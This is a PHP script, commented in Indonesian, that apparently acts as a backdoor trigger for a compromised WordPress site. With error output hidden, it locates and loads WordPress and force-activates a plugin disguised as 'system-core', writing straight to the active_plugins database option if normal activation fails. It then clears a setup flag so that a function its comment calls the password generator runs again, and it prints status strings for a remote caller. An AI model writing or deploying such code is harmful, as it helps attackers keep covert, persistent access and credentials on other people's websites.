<?php
error_reporting(0); ini_set('display_errors', 0);

// 1. Load WordPress Environment (Mundur 5 folder max)
$root = __DIR__; $wp_load = false;
for ($i=0; $i<5; $i++) {
    $root = dirname($root);
    if (file_exists($root . '/wp-load.php')) { $wp_load = $root . '/wp-load.php'; break; }
}
if (!$wp_load) die('WP_LOAD_NOT_FOUND');
require_once($wp_load);

// 2. Pastikan Library Plugin Admin Termuat
if (!function_exists('activate_plugin')) {
    require_once(ABSPATH . 'wp-admin/includes/plugin.php');
}

// 3. Logic Aktivasi Plugin (Self-Healing)
$plugin_path = 'system-core/system-core.php'; // Sesuaikan folder/file
if (!is_plugin_active($plugin_path)) {
    // Coba aktifkan standar
    activate_plugin($plugin_path);
    
    // Cek double via DB (Force Mode)
    $active = get_option('active_plugins', []);
    if (!in_array($plugin_path, $active)) {
        $active[] = $plugin_path;
        update_option('active_plugins', $active);
    }
}

// 4. Trigger Key Generation
// Hapus flag 'rls_setup_done' agar fungsi di system-core mau jalan lagi
delete_option('rls_setup_done'); 

// Panggil file utama system-core secara langsung
$core_file = __DIR__ . '/system-core.php';
if (file_exists($core_file)) {
    require_once($core_file);
    if (function_exists('rls_auto_setup')) {
        rls_auto_setup(); // Eksekusi fungsi pembuat password
        echo 'SYSTEM_CORE_ACTIVE_AND_TRIGGERED';
    } else {
        echo 'FUNC_NOT_FOUND';
    }
} else {
    echo 'CORE_FILE_MISSING';
}
?>
